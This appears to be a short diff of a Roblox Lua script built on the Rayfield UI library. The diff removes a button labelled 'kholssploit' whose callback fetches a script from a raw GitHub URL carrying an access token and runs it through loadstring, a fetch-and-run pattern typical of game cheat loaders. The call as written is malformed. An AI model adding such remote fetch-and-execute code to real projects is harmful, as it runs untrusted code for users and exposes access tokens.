@@ -111,11 +111,5 @@ UserInputService.WindowFocusReleased:Connect(
    end,
 })
  
-local Button = Tab:CreateButton({
-   Name = "kholssploit",
-   Callback = function()
-   loadstring("https://raw.githubusercontent.com/jjjiiw/kholssploit/main/kholssploit?token=GHSAT0AAAAAAB7Y4K4CBMS7CGVCOS4ALTDIZALDOCQ"))();
-   end,
-}) 
 
 Rayfield:LoadConfiguration()
